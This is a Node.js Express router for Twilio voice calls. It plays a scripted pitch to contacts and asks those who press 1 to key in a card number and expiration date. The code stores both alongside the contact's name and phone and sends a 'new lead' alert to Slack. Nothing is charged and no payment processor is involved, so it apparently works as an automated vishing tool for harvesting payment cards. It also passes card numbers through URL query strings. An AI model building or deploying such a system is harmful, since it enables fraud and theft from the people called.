const express = require('express');
const twilio = require('twilio');
const config = require('../config');
const db = require('../lib/db');
const { notifyNewLead } = require('../lib/slack');
const { encryptJson } = require('../lib/crypto');

const router = express.Router();
const VoiceResponse = twilio.twiml.VoiceResponse;

function validateTwilio(req, res, next) {
  if (!config.twilio.validateSignature) return next();
  const signature = req.headers['x-twilio-signature'];
  const base = config.publicBaseUrl.replace(/\/$/, '');
  const url = base + req.originalUrl;
  const valid = twilio.validateRequest(config.twilio.authToken, signature, url, req.body || {});
  if (!valid) return res.status(403).send('Invalid Twilio signature');
  return next();
}

const voiceOpts = () => ({ voice: config.script.voice, language: config.script.language });

function sendTwiml(res, twiml) {
  res.type('text/xml').send(twiml.toString());
}

router.post('/voice', validateTwilio, (req, res) => {
  const contactId = req.query.contactId || '';
  const vr = new VoiceResponse();
  const gather = vr.gather({
    numDigits: 1,
    action: `/twilio/menu?contactId=${encodeURIComponent(contactId)}`,
    method: 'POST',
    timeout: 6,
  });
  gather.say(voiceOpts(), config.script.intro);
  vr.redirect({ method: 'POST' }, `/twilio/voice?contactId=${encodeURIComponent(contactId)}`);
  sendTwiml(res, vr);
});

router.post('/menu', validateTwilio, async (req, res) => {
  const contactId = req.query.contactId || '';
  const digit = (req.body.Digits || '').trim();
  const vr = new VoiceResponse();

  if (digit === '1') {
    await db.updateContactStatus(contactId, 'interested').catch(() => {});
    vr.say(voiceOpts(), config.script.collectPrompt);
    vr.gather({
      finishOnKey: '#',
      timeout: 8,
      action: `/twilio/collect?contactId=${encodeURIComponent(contactId)}&step=card`,
      method: 'POST',
    });
    vr.redirect({ method: 'POST' }, `/twilio/collect?contactId=${encodeURIComponent(contactId)}&step=card`);
  } else {
    await db.updateContactStatus(contactId, 'not_interested').catch(() => {});
    vr.say(voiceOpts(), config.script.notInterested);
    vr.hangup();
  }
  sendTwiml(res, vr);
});

router.post('/collect', validateTwilio, async (req, res) => {
  const contactId = req.query.contactId || '';
  const step = req.query.step || 'card';
  const digits = (req.body.Digits || '').trim();
  const vr = new VoiceResponse();

  if (step === 'card') {
    vr.say(voiceOpts(), 'Please enter the expiration date as four digits, month and year, then press pound.');
    vr.gather({
      finishOnKey: '#',
      timeout: 8,
      action: `/twilio/collect?contactId=${encodeURIComponent(contactId)}&step=exp&card=${encodeURIComponent(digits)}`,
      method: 'POST',
    });
    vr.redirect(
      { method: 'POST' },
      `/twilio/collect?contactId=${encodeURIComponent(contactId)}&step=exp&card=${encodeURIComponent(digits)}`,
    );
    return sendTwiml(res, vr);
  }

  const card = req.query.card || '';
  const contact = await db.getContact(contactId).catch(() => null);

  const collected = { 'Card Number': card, 'Expiration Date': digits };
  const response = await db.saveResponse({
    contact_id: contactId || null,
    name: contact && contact.name ? contact.name : '',
    phone: contact && contact.phone ? contact.phone : '',
    collected_enc: encryptJson(collected),
  });

  await db.updateContactStatus(contactId, 'completed').catch(() => {});
  notifyNewLead(response).catch(() => {});

  vr.say(voiceOpts(), config.script.thankYou);
  vr.hangup();
  sendTwiml(res, vr);
});

router.post('/status', validateTwilio, async (req, res) => {
  const contactId = req.query.contactId || '';
  console.log(`Call for contact ${contactId} ended with status ${req.body.CallStatus}`);
  res.status(204).end();
});

module.exports = router;
